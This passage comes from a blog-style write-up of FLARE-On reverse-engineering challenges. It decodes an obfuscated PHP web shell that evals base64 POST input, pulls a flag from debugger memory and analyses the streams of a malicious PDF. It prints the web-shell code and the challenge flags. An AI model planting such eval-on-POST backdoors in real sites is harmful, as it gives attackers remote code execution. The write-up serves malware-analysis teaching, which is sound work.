class="mi">24</span><span class="p">,</span> <span class="mi">63</span><span class="p">,</span> <span class="mi">87</span><span class="p">,</span> <span class="mi">63</span><span class="p">,</span> <span class="mi">12</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">87</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">24</span><span class="p">,</span> <span class="mi">17</span><span class="p">,</span> <span class="mi">37</span><span class="p">,</span> <span class="mi">28</span><span class="p">,</span> <span class="mi">48</span><span class="p">,</span> <span class="mi">19</span><span class="p">,</span> <span class="mi">40</span><span class="p">,</span> <span class="mi">90</span><span class="p">,</span> <span class="mi">25</span><span class="p">,</span> <span class="mi">37</span><span class="p">,</span> <span class="mi">91</span><span class="p">,</span> <span class="mi">63</span><span class="p">,</span> <span class="mi">18</span><span class="p">,</span> <span class="mi">90</span><span class="p">,</span> <span class="mi">87</span><span class="p">,</span> <span class="mi">93</span><span class="p">,</span> <span class="mi">18</span><span class="p">,</span> <span class="mi">90</span><span class="p">,</span> <span class="mi">38</span><span class="p">,</span> <span class="mi">28</span><span class="p">,</span> <span class="mi">18</span><span class="p">,</span> <span class="mi">19</span><span class="p">,</span> <span class="mi">66</span><span class="p">,</span> <span class="mi">28</span><span class="p">,</span> <span class="mi">18</span><span class="p">,</span> <span class="mi">75</span><span class="p">,</span> <span class="mi">70</span><span class="p">,</span> <span class="mi">28</span><span class="p">,</span> <span class="mi">48</span><span class="p">,</span> <span class="mi">19</span><span class="p">,</span> <span class="mi">40</span><span class="p">,</span> <span class="mi">90</span><span class="p">,</span> <span class="mi">58</span><span class="p">,</span> <span class="mi">37</span><span class="p">,</span> <span class="mi">91</span><span class="p">,</span> <span class="mi">63</span><span class="p">,</span> <span class="mi">75</span><span class="p">,</span> <span class="mi">11</span><span class="p">,</span> <span class="mi">79</span><span class="p">,</span> <span class="mi">28</span><span class="p">,</span> <span class="mi">27</span><span class="p">,</span> <span class="mi">75</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="mi">42</span><span class="p">,</span> <span class="mi">23</span><span class="p">,</span> <span class="mi">88</span><span class="p">,</span> <span class="mi">30</span><span class="p">,</span> <span class="mi">35</span><span class="p">,</span> <span class="mi">47</span><span class="p">,</span> <span class="mi">59</span><span class="p">,</span> <span class="mi">71</span><span class="p">,</span> <span class="mi">71</span><span class="p">,</span> <span class="mi">73</span><span class="p">,</span> <span class="mi">35</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">38</span><span class="p">,</span> <span class="mi">63</span><span class="p">,</span> <span class="mi">8</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">38</span><span class="p">,</span> <span class="mi">45</span><span class="p">,</span> <span class="mi">30</span><span class="p">,</span> <span class="mi">81</span><span class="p">,</span> <span class="mi">15</span><span class="p">,</span> <span class="mi">50</span><span class="p">,</span> <span class="mi">12</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">24</span><span class="p">,</span> <span class="mi">81</span><span class="p">,</span> <span class="mi">66</span><span class="p">,</span> <span class="mi">28</span><span class="p">,</span> <span class="mi">40</span><span class="p">,</span> <span class="mi">90</span><span class="p">,</span> <span class="mi">58</span><span class="p">,</span> <span class="mi">81</span><span class="p">,</span> <span class="mi">40</span><span class="p">,</span> <span class="mi">30</span><span class="p">,</span> <span class="mi">75</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">27</span><span class="p">,</span> <span class="mi">19</span><span class="p">,</span> <span class="mi">75</span><span class="p">,</span> <span class="mi">28</span><span class="p">,</span> <span class="mi">23</span><span class="p">,</span> <span class="mi">75</span><span class="p">,</span> <span class="mi">77</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">28</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">43</span><span class="p">,</span> <span class="mi">52</span><span class="p">,</span> <span class="mi">31</span><span class="p">,</span> <span class="mi">19</span><span class="p">,</span> <span class="mi">75</span><span class="p">,</span> <span class="mi">81</span><span class="p">,</span> <span class="mi">40</span><span class="p">,</span> <span class="mi">30</span><span class="p">,</span> <span class="mi">75</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">27</span><span class="p">,</span> <span class="mi">75</span><span class="p">,</span> <span class="mi">77</span><span class="p">,</span> <span class="mi">35</span><span class="p">,</span> <span class="mi">47</span><span class="p">,</span> <span class="mi">59</span><span class="p">,</span> <span class="mi">71</span><span class="p">,</span> <span class="mi">71</span><span class="p">,</span> <span class="mi">71</span><span class="p">,</span> <span class="mi">73</span><span class="p">,</span> <span class="mi">21</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="mi">37</span><span class="p">,</span> <span class="mi">51</span><span class="p">,</span> <span class="mi">40</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="mi">7</span><span class="p">,</span> <span class="mi">91</span><span class="p">,</span> <span class="mi">7</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="mi">37</span><span class="p">,</span> <span class="mi">77</span><span class="p">,</span> <span class="mi">49</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="mi">7</span><span class="p">,</span> <span class="mi">91</span><span class="p">,</span> <span class="mi">70</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="mi">37</span><span class="p">,</span> <span class="mi">49</span><span class="p">,</span> <span class="mi">51</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="mi">51</span><span class="p">,</span> <span class="mi">91</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="mi">37</span><span class="p">,</span> <span class="mi">70</span><span class="p">,</span> <span class="mi">6</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="mi">7</span><span class="p">,</span> <span class="mi">91</span><span class="p">,</span> <span class="mi">91</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="mi">37</span><span class="p">,</span> <span class="mi">51</span><span class="p">,</span> <span class="mi">70</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="mi">7</span><span class="p">,</span> <span class="mi">91</span><span class="p">,</span> <span class="mi">49</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="mi">37</span><span class="p">,</span> <span class="mi">51</span><span class="p">,</span> <span class="mi">6</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="mi">7</span><span class="p">,</span> <span class="mi">91</span><span class="p">,</span> <span class="mi">91</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="mi">37</span><span class="p">,</span> <span class="mi">51</span><span class="p">,</span> <span class="mi">70</span><span class="p">,</span> <span class="mi">21</span><span class="p">,</span> <span class="mi">47</span><span class="p">,</span> <span class="mi">93</span><span class="p">,</span> <span class="mi">8</span><span class="p">,</span> <span class="mi">10</span><span class="p">,</span> <span class="mi">58</span><span class="p">,</span> <span class="mi">82</span><span class="p">,</span> <span class="mi">59</span><span class="p">,</span> <span class="mi">71</span><span class="p">,</span> <span class="mi">71</span><span class="p">,</span> <span class="mi">71</span><span class="p">,</span> <span class="mi">82</span><span class="p">,</span> <span class="mi">59</span><span class="p">,</span> <span class="mi">71</span><span class="p">,</span> <span class="mi">71</span><span class="p">,</span> <span class="mi">29</span><span class="p">,</span> <span class="mi">29</span><span class="p">,</span> <span class="mi">47</span><span class="p">]</span>
</span><span class="line">
</span><span class="line"><span class="n">do_me</span> <span class="o">=</span> <span class="s">&quot;&quot;</span>
</span><span class="line"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="nb">len</span><span class="p">(</span><span class="n">order</span><span class="p">)):</span>
</span><span class="line">    <span class="n">do_me</span> <span class="o">+=</span> <span class="n">terms</span><span class="p">[</span><span class="n">order</span><span class="p">[</span><span class="n">i</span><span class="p">]]</span>
</span><span class="line">
</span><span class="line"><span class="k">print</span> <span class="n">do_me</span>
</span></code></pre></td></tr></table></div></figure></notextile></div>

<p>Produces the following PHP code:</p>

<div class="bogus-wrapper"><notextile><figure class="code"><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
<span class="line-number">3</span>
<span class="line-number">4</span>
</pre></td><td class="code"><pre><code class="php"><span class="line"><span class="nv">$_</span><span class="o">=</span> <span class="s1">&#39;aWYoaXNzZXQoJF9QT1NUWyJcOTdcNDlcNDlcNjhceDRGXDg0XDExNlx4NjhcOTdceDc0XHg0NFx4NEZceDU0XHg2QVw5N1x4NzZceDYxXHgzNVx4NjNceDcyXDk3XHg3MFx4NDFcODRceDY2XHg2Q1w5N1x4NzJceDY1XHg0NFw2NVx4NTNcNzJcMTExXDExMFw2OFw3OVw4NFw5OVx4NkZceDZEIl0pKSB7IGV2YWwoYmFzZTY0X2RlY29kZSgkX1BPU1RbIlw5N1w0OVx4MzFcNjhceDRGXHg1NFwxMTZcMTA0XHg2MVwxMTZceDQ0XDc5XHg1NFwxMDZcOTdcMTE4XDk3XDUzXHg2M1wxMTRceDYxXHg3MFw2NVw4NFwxMDJceDZDXHg2MVwxMTRcMTAxXHg0NFw2NVx4NTNcNzJcMTExXHg2RVx4NDRceDRGXDg0XDk5XHg2Rlx4NkQiXSkpOyB9&#39;</span><span class="p">;</span>
</span><span class="line"><span class="nv">$__</span><span class="o">=</span><span class="s1">&#39;JGNvZGU9YmFzZTY0X2RlY29kZSgkXyk7ZXZhbCgkY29kZSk7&#39;</span><span class="p">;</span>
</span><span class="line"><span class="nv">$___</span><span class="o">=</span><span class="s2">&quot;</span><span class="se">\x62\141\x73\145\x36\64\x5f\144\x65\143\x6f\144\x65</span><span class="s2">&quot;</span><span class="p">;</span> <span class="c1">// base64_decode</span>
</span><span class="line"><span class="k">eval</span><span class="p">(</span><span class="nv">$___</span><span class="p">(</span><span class="nv">$__</span><span class="p">));</span>
</span></code></pre></td></tr></table></div></figure></notextile></div>

<p>Contents of <code>$_</code> and <code>$__</code> are clearly encoded in <code>base64</code> and  <code>$___</code> is <code>base64_decode</code>. Base64 can be decoded in Python by calling <code>base64.b64decode</code>.
Line #4 can be re-written as </p>

<div class="bogus-wrapper"><notextile><figure class="code"><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
<span class="line-number">3</span>
<span class="line-number">4</span>
<span class="line-number">5</span>
</pre></td><td class="code"><pre><code class="php"><span class="line"><span class="k">eval</span><span class="p">(</span><span class="nb">base64_decode</span><span class="p">(</span><span class="s1">&#39;JGNvZGU9YmFzZTY0X2RlY29kZSgkXyk7ZXZhbCgkY29kZSk7&#39;</span><span class="p">));</span>
</span><span class="line">
</span><span class="line"><span class="c1">// result</span>
</span><span class="line">
</span><span class="line"><span class="nv">$code</span><span class="o">=</span><span class="nb">base64_decode</span><span class="p">(</span><span class="nv">$_</span><span class="p">);</span>    <span class="k">eval</span><span class="p">(</span><span class="nv">$code</span><span class="p">);</span>
</span></code></pre></td></tr></table></div></figure></notextile></div>

<p>So it must decode the first base64 blob and eval it. Let’s decode it:</p>

<div class="bogus-wrapper"><notextile><figure class="code"><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
<span class="line-number">3</span>
<span class="line-number">4</span>
</pre></td><td class="code"><pre><code class="php"><span class="line"><span class="k">if</span><span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s2">&quot;\97</span><span class="se">\4</span><span class="s2">9</span><span class="se">\4</span><span class="s2">9</span><span class="se">\6</span><span class="s2">8</span><span class="se">\x4F</span><span class="s2">\84</span><span class="se">\116\x68</span><span class="s2">\97</span><span class="se">\x74\x44\x4F\x54\x6A</span><span class="s2">\97</span><span class="se">\x76\x61\x35\x63\x72</span><span class="s2">\97</span><span class="se">\x70\x41</span><span class="s2">\84</span><span class="se">\x66\x6C</span><span class="s2">\97</span><span class="se">\x72\x65\x44\65\x53\72\111\110\6</span><span class="s2">8</span><span class="se">\7</span><span class="s2">9\84\99</span><span class="se">\x6F\x6D</span><span class="s2">&quot;</span><span class="p">]))</span>
</span><span class="line"><span class="p">{</span>
</span><span class="line"><span class="k">eval</span><span class="p">(</span><span class="nb">base64_decode</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s2">&quot;\97</span><span class="se">\4</span><span class="s2">9</span><span class="se">\x31\6</span><span class="s2">8</span><span class="se">\x4F\x54\116\104\x61\116\x44\7</span><span class="s2">9</span><span class="se">\x54\106</span><span class="s2">\97</span><span class="se">\11</span><span class="s2">8\97</span><span class="se">\53\x63\114\x61\x70\65</span><span class="s2">\84</span><span class="se">\102\x6C\x61\114\101\x44\65\x53\72\111\x6E\x44\x4F</span><span class="s2">\84\99</span><span class="se">\x6F\x6D</span><span class="s2">&quot;</span><span class="p">]));</span>
</span><span class="line"><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure></notextile></div>

<p>This looks like a POST request. The characters look like a mix of ASCII and Hex values. Let’s print them using Python and hope this is the last encoding:</p>

<div class="bogus-wrapper"><notextile><figure class="code"><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
<span class="line-number">3</span>
</pre></td><td class="code"><pre><code class="python"><span class="line"><span class="n">mylist</span><span class="o">=</span> <span class="p">[</span><span class="mi">97</span><span class="p">,</span><span class="mi">49</span><span class="p">,</span><span class="mi">49</span><span class="p">,</span><span class="mi">68</span><span class="p">,</span><span class="mh">0x4F</span><span class="p">,</span><span class="mi">84</span><span class="p">,</span><span class="mi">116</span><span class="p">,</span><span class="mh">0x68</span><span class="p">,</span><span class="mi">97</span><span class="p">,</span><span class="mh">0x74</span><span class="p">,</span><span class="mh">0x44</span><span class="p">,</span><span class="mh">0x4F</span><span class="p">,</span><span class="mh">0x54</span><span class="p">,</span><span class="mh">0x6A</span><span class="p">,</span><span class="mi">97</span><span class="p">,</span><span class="mh">0x76</span><span class="p">,</span><span class="mh">0x61</span><span class="p">,</span><span class="mh">0x35</span><span class="p">,</span><span class="mh">0x63</span><span class="p">,</span><span class="mh">0x72</span><span class="p">,</span><span class="mi">97</span><span class="p">,</span><span class="mh">0x70</span><span class="p">,</span><span class="mh">0x41</span><span class="p">,</span><span class="mi">84</span><span class="p">,</span><span class="mh">0x66</span><span class="p">,</span><span class="mh">0x6C</span><span class="p">,</span><span class="mi">97</span><span class="p">,</span><span class="mh">0x72</span><span class="p">,</span><span class="mh">0x65</span><span class="p">,</span><span class="mh">0x44</span><span class="p">,</span><span class="mi">65</span><span class="p">,</span><span class="mh">0x53</span><span class="p">,</span><span class="mi">72</span><span class="p">,</span><span class="mi">111</span><span class="p">,</span><span class="mi">110</span><span class="p">,</span><span class="mi">68</span><span class="p">,</span><span class="mi">79</span><span class="p">,</span><span class="mi">84</span><span class="p">,</span><span class="mi">99</span><span class="p">,</span><span class="mh">0x6F</span><span class="p">,</span><span class="mh">0x6D</span><span class="p">]</span>
</span><span class="line">
</span><span class="line"><span class="k">print</span> <span class="s">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span> <span class="nb">chr</span><span class="p">(</span><span class="n">item</span><span class="p">)</span> <span class="k">for</span> <span class="n">item</span> <span class="ow">in</span> <span class="n">mylist</span><span class="p">)</span>
</span></code></pre></td></tr></table></div></figure></notextile></div>

<p>Fortunately, we are done.</p>

<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span>Flag 2 </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
<span class="line-number">3</span>
</pre></td><td class="code"><pre><code class=""><span class="line">a11DOTthatDOTjava5crapATflareDASHonDOTcom
</span><span class="line">or
</span><span class="line">a11.that.java5crap@flare-on.com</span></code></pre></td></tr></table></div></figure></notextile></div>

<hr />

<h2 id="a-namech3a-challenge-3---cheating-my-way-to-the-top"><a name="ch3"></a> Challenge 3 - Cheating My Way to the Top</h2>

<div class="bogus-wrapper"><notextile><figure class="code"><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
<span class="line-number">3</span>
</pre></td><td class="code"><pre><code class=""><span class="line">Nice job, you're really knocking these out! Here's the next binary. The password to the zip archive is "malware" again.
</span><span class="line">Keep up the good work, and good luck!
</span><span class="line">-FLARE</span></code></pre></td></tr></table></div></figure></notextile></div>

<p>Challenge 3 is a Win32 binary called <code>such_evil</code>. <code>PE-Studio</code> does not tell us much.</p>

<p>Running it will result in this message:</p>

<p><img src="http://parsiya.net/images/2014/flare/3-1.jpg" alt="BrokenByte" title="BrokenByte" /></p>

<p>I cheated in this challenge. I just dropped the executable in <code>Immunity Debugger</code>, ran it and looked in memory when the message box popped up and the email was there:</p>

<p><img src="http://parsiya.net/images/2014/flare/3-2.jpg" alt="Flag in memory" title="Flag in memory" /></p>

<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span>Flag 3 </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
</pre></td><td class="code"><pre><code class=""><span class="line">such.5h311010101@flare-on.com</span></code></pre></td></tr></table></div></figure></notextile></div>

<hr />

<h2 id="a-namech4a-challenge-4---things-are-getting-cereal"><a name="ch4"></a> Challenge 4 - Things are Getting Cereal</h2>

<div class="bogus-wrapper"><notextile><figure class="code"><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
<span class="line-number">3</span>
</pre></td><td class="code"><pre><code class=""><span class="line">Well done! Such dedication, much work, wow.
</span><span class="line">Here's the next challenge, password is the same as last time. We'll talk more when you figure it out.
</span><span class="line">-FLARE</span></code></pre></td></tr></table></div></figure></notextile></div>

<p>It’s a two page PDF name <code>APT9001.pdf</code>. First page is a picture of APT1 report and second page is empty.
We can just open the PDF in a <code>HxD</code> but it won’t tell us much.
There are tools that will help us parse the PDF. I used <code>pyew</code>. You can find a good tutorial for PDF analysis <a href="https://code.google.com/p/pyew/wiki/PDFAnalysis">here</a>.<br />
Let’s follow the tutorial:</p>

<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span>pyew output for the PDF </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
<span class="line-number">3</span>
<span class="line-number">4</span>
<span class="line-number">5</span>
<span class="line-number">6</span>
<span class="line-number">7</span>
<span class="line-number">8</span>
<span class="line-number">9</span>
<span class="line-number">10</span>
<span class="line-number">11</span>
<span class="line-number">12</span>
<span class="line-number">13</span>
<span class="line-number">14</span>
<span class="line-number">15</span>
<span class="line-number">16</span>
<span class="line-number">17</span>
<span class="line-number">18</span>
<span class="line-number">19</span>
<span class="line-number">20</span>
<span class="line-number">21</span>
<span class="line-number">22</span>
<span class="line-number">23</span>
<span class="line-number">24</span>
<span class="line-number">25</span>
<span class="line-number">26</span>
<span class="line-number">27</span>
<span class="line-number">28</span>
<span class="line-number">29</span>
<span class="line-number">30</span>
<span class="line-number">31</span>
<span class="line-number">32</span>
<span class="line-number">33</span>
<span class="line-number">34</span>
<span class="line-number">35</span>
<span class="line-number">36</span>
<span class="line-number">37</span>
<span class="line-number">38</span>
<span class="line-number">39</span>
<span class="line-number">40</span>
</pre></td><td class="code"><pre><code class="powershell"><span class="line"><span class="p">$</span> <span class="n">python</span> <span class="n">pyew</span><span class="p">.</span><span class="n">py</span> <span class="n">APT9001</span><span class="p">.</span><span class="n">pdf</span>
</span><span class="line"><span class="n">PDF</span> <span class="n">File</span>
</span><span class="line">
</span><span class="line"><span class="n">PDFiD</span> <span class="n">0</span><span class="p">.</span><span class="n">0</span><span class="p">.</span><span class="n">11</span> <span class="n">APT9001</span><span class="p">.</span><span class="n">pdf</span>
</span><span class="line"> <span class="n">PDF</span> <span class="n">Header</span><span class="err">:</span> <span class="k">%</span><span class="n">PDF</span><span class="p">-</span><span class="n">1</span><span class="p">.</span><span class="n">5</span>
</span><span class="line"> <span class="n">obj</span>                   <span class="n">10</span>
</span><span class="line"> <span class="n">endobj</span>                 <span class="n">9</span>
</span><span class="line"> <span class="n">stream</span>                 <span class="n">3</span>
</span><span class="line"> <span class="n">endstream</span>              <span class="n">3</span>
</span><span class="line"> <span class="n">xref</span>                   <span class="n">2</span>
</span><span class="line"> <span class="n">trailer</span>                <span class="n">2</span>
</span><span class="line"> <span class="n">startxref</span>              <span class="n">2</span>
</span><span class="line"> <span class="p">/</span><span class="n">Page</span>                  <span class="n">3</span><span class="p">(</span><span class="n">2</span><span class="p">)</span>
</span><span class="line"> <span class="p">/</span><span class="n">Encrypt</span>               <span class="n">0</span>
</span><span class="line"> <span class="p">/</span><span class="n">ObjStm</span>                <span class="n">0</span>
</span><span class="line"> <span class="p">/</span><span class="n">JS</span>                    <span class="n">1</span><span class="p">(</span><span class="n">1</span><span class="p">)</span>
</span><span class="line"> <span class="p">/</span><span class="n">JavaScript</span>            <span class="n">1</span><span class="p">(</span><span class="n">1</span><span class="p">)</span>
</span><span class="line"> <span class="p">/</span><span class="n">AA</span>                    <span class="n">0</span>
</span><span class="line"> <span class="p">/</span><span class="n">OpenAction</span>            <span class="n">1</span><span class="p">(</span><span class="n">1</span><span class="p">)</span>
</span><span class="line"> <span class="p">/</span><span class="n">AcroForm</span>              <span class="n">0</span>
</span><span class="line"> <span class="p">/</span><span class="n">JBIG2Decode</span>           <span class="n">1</span><span class="p">(</span><span class="n">1</span><span class="p">)</span>
</span><span class="line"> <span class="p">/</span><span class="n">RichMedia</span>             <span class="n">0</span>
</span><span class="line"> <span class="p">/</span><span class="n">Launch</span>                <span class="n">0</span>
</span><span class="line"> <span class="p">/</span><span class="n">Colors</span> <span class="p">&gt;</span> <span class="n">2</span><span class="p">^</span><span class="n">24</span>         <span class="n">0</span>
</span><span class="line"> <span class="p">%</span><span class="k">%</span><span class="n">EOF</span>                  <span class="n">1</span>
</span><span class="line"> <span class="n">After</span> <span class="n">last</span> <span class="p">%</span><span class="k">%</span><span class="n">EOF</span>       <span class="n">0</span>
</span><span class="line"> <span class="n">Total</span> <span class="n">entropy</span><span class="err">:</span>           <span class="n">7</span><span class="p">.</span><span class="n">862012</span> <span class="p">(</span>     <span class="n">21284</span> <span class="n">bytes</span><span class="p">)</span>
</span><span class="line"> <span class="n">Entropy</span> <span class="n">inside</span> <span class="n">streams</span><span class="err">:</span>  <span class="n">7</span><span class="p">.</span><span class="n">890539</span> <span class="p">(</span>     <span class="n">19723</span> <span class="n">bytes</span><span class="p">)</span>
</span><span class="line"> <span class="n">Entropy</span> <span class="n">outside</span> <span class="n">streams</span><span class="err">:</span> <span class="n">4</span><span class="p">.</span><span class="n">745484</span> <span class="p">(</span>      <span class="n">1561</span> <span class="n">bytes</span><span class="p">)</span>
</span><span class="line">
</span><span class="line"><span class="c"># first 512 bytes of the PDF removed</span>
</span><span class="line">
</span><span class="line"><span class="c"># To list the streams that are encoded and see what filters the stream is using type &quot;pdfilter&quot;: </span>
</span><span class="line"><span class="p">[</span><span class="n">0x00000000</span><span class="p">]&gt;</span> <span class="n">pdfilter</span>
</span><span class="line"><span class="n">Stream</span> <span class="n">1</span> <span class="n">uses</span> <span class="n">FlateDecode</span>
</span><span class="line"><span class="n">Stream</span> <span class="n">1</span> <span class="n">uses</span> <span class="n">ASCIIHexDecode</span>
</span><span class="line"><span class="n">Stream</span> <span class="n">2</span> <span class="n">uses</span> <span class="n">FlateDecode</span>
</span><span class="line"><span class="n">Stream</span> <span class="n">2</span> <span class="n">uses</span> <span class="n">ASCIIHexDecode</span>
</span><span class="line"><span class="n">Stream</span> <span class="n">2</span> <span class="n">uses</span> <span class="n">JBIG2Decode</span>
</span><span class="line"><span class="n">Stream</span> <span class="n">3</span> <span class="n">uses</span> <span class="n">FlateDecode</span>
</span></code></pre></td></tr></table></div></figure></notextile></div>

<p>Seems like streams 1,2 and 3 are interesting. According to the tutorial <code>pdfvi</code> displays them.</p>

<ul>
  <li>FlateDecode: Decompress. In Python do <code>zlib.decompress</code></li>
  <li>ASCIIHexDecode: Decode from ASCII Hex</li>
  <li>JBIG2Decode: Decode as a black and white image</li>
</ul>

<p>What really threw me off was the <code>JBIG2Decode</code> decoder for stream 2. There was a <a href="http://vrt-blog.snort.org/2009/02/have-nice-weekend-pdf-love.html">vulnerability</a> associated with it. It is too short to be the email (14 bytes). It is not compressed (lacks the magic headers). <code>Pyew</code> also displays the disassembly but it is not shellcode either (if it is, then I didn’t recognize it). It is also not an image (hence the <code>JBIG2Decode</code> filter).</p>

<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span>Stream 2 </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
<span class="line-number">3</span>
<span class="line-number">4</span>
<span class="line-number">5</span>
<span class="line-number">6</span>
<span class="line-number">7</span>
<span class="line-number">8</span>
<span class="line-number">9</span>
<span class="line-number">10</span>
<span class="line-number">11</span>
<span class="line-number">12</span>
<span class="line-number">13</span>
<span class="line-number">14</span>
<span class="line-number">15</span>
<span class="line-number">16</span>
<span class="line-number">17</span>
<span class="line-number">18</span>
</pre></td><td class="code"><pre><code class="nasm"><span class="line"><span class="nf">Applying</span> <span class="nv">Filter</span> <span class="nv">FlateDecode</span> <span class="nv">...</span>
</span><span class="line"><span class="nf">Applying</span> <span class="nv">Filter</span> <span class="nv">ASCIIHexDecode</span> <span class="nv">...</span>
</span><span class="line"><span class="nf">Applying</span> <span class="nv">Filter</span> <span class="nv">JBIG2Decode</span> <span class="nv">...</span>
</span><span class="line"><span class="nf">Encoded</span> <span class="nv">Stream</span> <span class="mi">2</span>
</span><span class="line"><span class="err">--------------------------------------------------------------------------------</span>
</span><span class="line"><span class="err">0000</span>   <span class="err">00</span> <span class="err">20</span> <span class="err">50</span> <span class="nf">FF</span> <span class="mi">40</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">69</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">05</span> <span class="mi">69</span> <span class="mi">50</span> <span class="mi">50</span>          <span class="nv">.</span> <span class="nv">P.@..i...iPP</span>
</span><span class="line"><span class="err">--------------------------------------------------------------------------------</span>
</span><span class="line">
</span><span class="line"><span class="nf">Show</span> <span class="nb">di</span><span class="nv">sassembly</span> <span class="p">(</span><span class="nv">y</span><span class="o">/</span><span class="nv">n</span><span class="p">)</span><span class="nv">?</span> <span class="p">[</span><span class="nv">n</span><span class="p">]:</span> <span class="nv">y</span>
</span><span class="line"><span class="err">0</span><span class="nf">x00000000</span> <span class="p">(</span><span class="mi">02</span><span class="p">)</span> <span class="mi">0020</span>                 <span class="nv">ADD</span> <span class="p">[</span><span class="nb">EAX</span><span class="p">],</span> <span class="nb">AH</span>
</span><span class="line"><span class="err">0</span><span class="nf">x00000002</span> <span class="p">(</span><span class="mi">01</span><span class="p">)</span> <span class="mi">50</span>                   <span class="nv">PUSH</span> <span class="nb">EAX</span>
</span><span class="line"><span class="err">0</span><span class="nf">x00000003</span> <span class="p">(</span><span class="mi">03</span><span class="p">)</span> <span class="nv">ff40</span> <span class="mi">00</span>              <span class="nv">INC</span> <span class="kt">DWORD</span> <span class="p">[</span><span class="nb">EAX</span><span class="o">+</span><span class="mh">0x0</span><span class="p">]</span>
</span><span class="line"><span class="err">0</span><span class="nf">x00000006</span> <span class="p">(</span><span class="mi">03</span><span class="p">)</span> <span class="mi">0069</span> <span class="mi">00</span>              <span class="nv">ADD</span> <span class="p">[</span><span class="nb">ECX</span><span class="o">+</span><span class="mh">0x0</span><span class="p">],</span> <span class="nb">CH</span>
</span><span class="line"><span class="err">0</span><span class="nf">x00000009</span> <span class="p">(</span><span class="mi">01</span><span class="p">)</span> <span class="mi">00</span>                   <span class="nv">DB</span> <span class="mh">0x0</span>
</span><span class="line"><span class="err">0</span><span class="nf">x0000000a</span> <span class="p">(</span><span class="mi">01</span><span class="p">)</span> <span class="mi">05</span>                   <span class="nv">DB</span> <span class="mh">0x5</span>
</span><span class="line"><span class="err">0</span><span class="nf">x0000000b</span> <span class="p">(</span><span class="mi">01</span><span class="p">)</span> <span class="mi">69</span>                   <span class="nv">DB</span> <span class="mh">0x69</span>
</span><span class="line"><span class="err">0</span><span class="nf">x0000000c</span> <span class="p">(</span><span class="mi">01</span><span class="p">)</span> <span class="mi">50</span>                   <span class="nv">PUSH</span> <span class="nb">EAX</span>
</span><span class="line"><span class="err">0</span><span class="nf">x0000000d</span> <span class="p">(</span><span class="mi">01</span><span class="p">)</span> <span class="mi">50</span>                   <span class="nv">PUSH</span> <span class="nb">EAX</span>
</span></code></pre></td></tr></table></div></figure></notextile></div>

<p>Let’s take a look at stream 1 using <code>pdfvi</code>.</p>

<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span>Stream 1 </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
<span class="line-number">3</span>
<span class="line-number">4</span>
<span class="line-number">5</span>
<span class="line-number">6</span>
<span class="line-number">7</span>
<span class="line-number">8</span>
<span class="line-number">9</span>
<span class="line-number">10</span>
<span class="line-number">11</span>
<span class="line-number">12</span>
<span class="line-number">13</span>
<span class="line-number">14</span>
<span class="line-number">15</span>
<span class="line-number">16</span>
<span class="line-number">17</span>
<span class="line-number">18</span>
<span class="line-number">19</span>
<span class="line-number">20</span>
<span class="line-number">21</span>
<span class="line-number">22</span>
<span class="line-number">23</span>
<span class="line-number">24</span>
